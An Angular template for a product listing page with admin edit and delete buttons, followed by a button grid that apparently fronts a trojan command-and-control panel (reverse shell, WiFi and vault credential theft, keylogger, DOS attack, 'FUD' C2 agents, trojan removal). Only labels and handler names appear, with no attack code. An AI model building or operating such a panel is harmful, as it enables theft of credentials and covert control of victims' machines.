<app-menu></app-menu>
<div class="container">
  <table class="table table-dark">
    <thead>
      <tr>
        <th scope="col">Id</th>
        <th scope="col">Nombre</th>
        <th scope="col">Precio</th>
        <th scope="col">Ver</th>
        <th scope="col" *ngIf="isAdmin">Editar</th>
        <th scope="col" *ngIf="isAdmin">Borrar</th>
      </tr>
    </thead>
    <tbody>
      <tr *ngFor="let producto of productos">
        <td>{{producto.id}}</td>
        <td>{{producto.nombre}}</td>
        <td>{{producto.precio}}â‚¬</td>
        <td><button class="btn btn-outline-primary" routerLink="/detalle/{{producto.id}}"><i class="far fa-eye"></i> Ver</button></td>
        <td *ngIf="isAdmin"><button class="btn btn-outline-warning" routerLink="/editar/{{producto.id}}"><i class="far fa-edit"></i> Editar</button></td>
        <td *ngIf="isAdmin"><button class="btn btn-outline-danger" (click)="borrar(producto.id)"><i class="far fa-trash-alt"></i> Eliminar</button></td>
      </tr>
    </tbody>
  </table>
  <div class="mt-3" *ngIf="isAdmin">
    <button class="btn btn-outline-success btn-lg" routerLink="/nuevo">
      <i class="fas fa-plus-circle"></i> Nuevo producto
    </button>
  </div>
  <div class="contenedor">
    <!--Primera fila -->
    <button class="btnDecorado" (click)="reverseShell()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>Reverse Shell</p>
    </button>
    <button class="btnDecorado" (click)="launchCommands()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>Launch Commands</p>
    </button>
    <button class="btnDecorado" (click)="getFiles()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>Get Files</p>
    </button>
    <button class="btnDecorado" (click)="putFiles()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>Put Files</p>
    </button>
    <button class="btnDecorado" (click)="autoExecute()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>Auto Execute Binary</p>
    </button>
    <button class="btnDecorado" (click)="getInfo()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>Get Info Machine</p>
    </button>
    <!--Segunda fila-->
    <button class="btnDecorado" (click)="getWifi()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>Get WiFi Credentials</p>
    </button>
    <button class="btnDecorado" (click)="getCredentials()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>Get WEB/Vault Credentials</p>
    </button>
    <button class="btnDecorado" (click)="executeKeylogger()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>Execute Keylogger</p>
    </button>
    <button class="btnDecorado" (click)="dosAttack()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>DOS attack</p>
    </button>
    <button class="btnDecorado" (click)="screenShots()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>ScreenShots</p>
    </button>
    <button class="btnDecorado" (click)="c2Agents()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>C2 Agents FUD</p>
    </button>
    <!--Tercera fila-->
    <button class="btnDecorado" (click)="listFiles()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>List Files ID</p>
    </button>
    <button class="btnDecorado" (click)="listPictures()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>List Pictures ID</p>
    </button>
    <button class="btnDecorado" (click)="listServer()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>List Files Server</p>
    </button>
    <button class="btnDecorado" (click)="listLogs()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>List Logs ID</p>
    </button>
    <br />
    <!--Cuarta fila-->
    <button class="btnDecorado" (click)="removeCommand()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>Remove Last Command Launched</p>
    </button>
    <button class="btnDecorado" (click)="removeTrojan()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>Remove Trojan</p>
    </button>
    <br />
    <!--Quinta fila-->
    <button class="btnDecorado" (click)="changeServer()">
      <img src="reverse.jpg" height="50" width="100" /><br /> <p>Change HTTP Server</p>
    </button>
  </div>
</div>
